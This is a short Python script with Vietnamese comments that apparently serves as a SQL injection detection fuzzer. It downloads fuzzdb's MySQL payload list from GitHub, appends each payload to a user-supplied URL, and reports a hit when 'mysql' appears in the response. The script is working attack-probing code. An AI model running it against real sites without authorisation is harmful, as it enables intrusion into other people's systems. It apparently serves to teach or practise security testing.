# khai báo thư viện requests để thực hiện gửi requets lên server cần test
import requests
# khai báo thư viện os.path để thực hiện với bài này là thực hiện check xem file đã tồn tại hay chưa
import os.path

# thực hiên chức năng fuzzing
def fuzz_sqli(url):
    payloads = []
    # check xem thông tin file sqli.txt có tồn tại trên thư mục không
    if os.path.exists("sqli.txt") == False:
        # nếu file không tồn tại thì thực hiện tạo file
        with open("sqli.txt", "wb") as f:
            # thực hiện lấy nội dung file từ trên github về để phục vụ công việc fuzzing sqli
            res = requests.get("https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/sql-injection/detect/MySQL.txt")
            # ghi thông tin nội dung lấy đưuọc vào file sqli.txt
            f.write(res.text.encode())
            f.close()
    # mở file và thực hiện lấy thông tin nội dung từng dòng của file cho vào mảng payloads để chuẩn bị thực hiện fuzzing
    with open("sqli.txt", "r") as f:
        for line in f:
            payloads.append(line[:-1])

    # bắt đầu fuzzing
    for payload in payloads:
        # gửi từng request cùng với path login lên url
        res = requests.get(url + payload)
        # nếu response trả về mysql thì khi đó server bị lỗi
        if "mysql" in res.text.lower():
            print("Payload Sqli Successful : " + payload)

def main():
    # nhập thông tin url muốn detect sqli
    url = input("Enter: ")
    # bắt đầu fuzzing
    fuzz_sqli(url)

if __name__ == "__main__":
    main()